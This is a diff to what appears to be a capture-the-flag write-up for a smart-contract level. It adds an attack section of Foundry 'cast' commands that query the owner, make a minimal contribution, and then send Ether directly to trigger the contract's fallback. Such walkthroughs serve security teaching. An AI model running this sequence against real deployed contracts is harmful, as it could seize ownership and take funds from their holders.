@@ -22,7 +22,13 @@ The `contribute` function requires that the value of Ether sent is less than 0.0
 
 ## Attack
 
+1. cast call $CONTRACT_ADDRESS "owner()" --rpc-url $ALCHEMY_RPC_URL
+2. cast call $CONTRACT_ADDRESS "getContribution()" --rpc-url $ALCHEMY_RPC_URL --from $ACCOUNT_ADDRESS
 
+3. cast send $CONTRACT_ADDRESS "contribute()" --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
+
+4. # {value: msg.value}("")
+cast send $CONTRACT_ADDRESS --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
 
 ## Fix
 
